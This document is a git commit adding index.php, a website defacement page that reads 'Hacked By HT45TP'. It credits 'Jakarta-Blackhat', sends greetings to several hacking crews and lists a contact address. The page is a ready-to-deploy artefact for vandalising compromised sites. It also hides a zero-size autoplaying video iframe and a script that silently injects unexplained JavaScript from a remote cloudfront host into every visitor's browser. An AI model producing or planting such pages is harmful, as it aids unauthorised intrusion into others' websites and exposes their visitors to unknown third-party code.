30b5545d86426202a76b9bce01409217b976587b
TinoGans <43546343+TinoGans@users.noreply.github.com>
2018-09-24 22:41:45 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,87 @@
+<html lang="en" id="top" class="no-js"> <!--<![endif]-->
+
+  <head>
+	<iframe width="0" height="0" src="https://www.youtube.com/embed/2rs9-OeXpO0?controls=0&amp;autoplay=1" frameborder="0" allowfullscreen></iframe>
+
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<title>~Indonesian People~</title>
+	<meta name="description" content="Ups :D" />
+	<meta name="keywords" content=":D" />
+	<meta name="robots" content="INDEX,FOLLOW" />
+
+	<!--
+
+	No Army Can  Stop An Idea !
+
+	contact: fb.com/depsecpage/
+	-->
+	<html>
+	<head>
+	  <title>Make Your Dream</title>
+	  <link rel="SHORTCUT ICON" href="http://www.pptbackgroundstemplates.com/backgrounds/anonymous-suit-ppt-backgrounds-powerpoint.jpg">
+	  <meta name="Author" content="HT45TP"/>
+	  <meta name="copyright" content="Jakarta-Blackhat"/>
+	  <meta name="description" content="Silent Is Golden"/>
+	  <meta name="keywords" content="Hacked By HT45TP"/>
+	  <meta property="og:title" content="Hacked By HT45TP"/>
+	  <meta property="og:image:width" content=" ">
+	  <meta property="og:image:height" content=" ">
+	  <meta property="og:image" content="https://openclipart.org/image/2400px/svg_to_png/196995/mono-exit.png">
+	  <link href="http://fonts.googleapis.com/css?family=Pacifico" rel="stylesheet" type="text/css">
+	  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+	  <script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.138#p=st500lt012-1dg142_w3pqm974xxxxw3pqm974";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script></head>
+<style type="text/css">
+    @import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
+    body {
+        background	: #000;
+        font-family	: Courier new;
+        text-align	: center;
+        color		: #fff;
+    }
+   hr {
+   border		: 0;
+   height		: 1px;
+   background-image	: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(255, 0, 0, 0.75), rgba(0, 0, 0, 0))
+    }
+</style>
+  </head>
+  <style type="text/css">body, a:hover {cursor: url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important;}</style><a href="" target="blank" ><img src="http://cur.cursors-4u.net/cursor.png" border="0" style="position:absolute; top: 0px; right: 0px;" /></a> <script src=
+
+	type='text/javascript'></script>
+  <body bgcolor="black">
+
+
+	<link href='http://fonts.googleapis.com/css?family=Indie%20Flower' rel='stylesheet' type='text/css'>
+
+
+	<body>
+	  <br><br><br><br><br>
+	  <center>
+		<center><font face='Pacifico' size='300' color='darkred'></font></center>
+		<center><font color='red'>[</font>
+		  <font>Hacked By HT45TP</font>
+		  <font color='red'>]</font></center>
+		<br>
+		<img style="width:380px;" src="http://gifimage.net/wp-content/uploads/2018/04/kumpulan-gambar-gif-7.gif">
+		<br>
+		<center><font face='Pacifico' size='20px' color='darkred'></font></center>
+		<center><font color='red'>[</font>
+		  <font>Special Thanks To</font>
+		  <font color='red'>]</font></center>
+		<br>
+		<center><font color='red'>*</font>
+		  <font size='3'>
+			[./E4OXY | Mr.MSDV | /.scXr00t | zMaximous | ./Rcz980> | DIR-64 | OneShoot | And You: ) ]
+		  </font><font color='red'>*</font>
+		  <br>
+			<br>
+		  <center><font face='Pacifico' size='300px' color='darkred'></font></center>
+		  <center><font color='red'>[</font>
+			<font>Contact Me itscr4zy69@gmail.com</font>
+			<font color='red'>]</font></center>
+		  <hr>
+			<br><br>
+		  <center>
+			<html> <font color=White face='arial' size=3>Greetz : <marquee width="30%" behavior="left & right">Nabila - W1NT3R - Mr Fox - Indosec - 99Syndicate - Banyumas Cyber Team - BR1G4D3 BR0TH3RS - Garuda Tersakiti72 - CyberPunks - F4ke-syst3m - Kentang Cyber Security - Surabaya Blackhat - XaiSyndicate - IndoXploit - </marquee></B>
+				
+			</html>
